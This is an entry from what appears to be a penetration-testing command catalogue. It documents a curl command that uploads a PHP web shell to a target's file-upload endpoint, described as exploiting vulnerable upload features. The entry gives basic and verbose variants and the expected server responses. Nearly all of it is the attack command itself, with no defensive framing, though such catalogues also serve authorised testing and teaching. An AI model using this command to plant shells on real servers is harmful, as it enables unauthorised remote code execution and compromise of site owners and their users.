---
id: cmd-002
data: 'curl -X POST -F "file=@shell.php" http://target.com/upload.php'
tags:
  - upload
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.734Z'
verified: false
validated: true
submitted: true
---
# curl-upload-file

## Command

```bash
curl -X POST -F "file=@shell.php" http://target.com/upload.php
```

## Description

Uploads a local file (e.g., PHP shell) to a target web endpoint via HTTP POST multipart form data, exploiting vulnerable upload features.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-F "file=@shell.php"` | Form field with file attachment | Yes |
| `http://target.com/upload.php` | Target upload endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -F "file=@shell.php" http://target.com/upload.php
```

### Advanced Usage

```bash
curl -X POST -F "file=@shell.php" -F "submit=Upload" http://target.com/upload.php --verbose
```

## Expected Output

HTTP response from server, such as 200 OK with success message or file path. Errors indicate failure (e.g., 403 Forbidden).

## Related

- [[Related Procedure]]
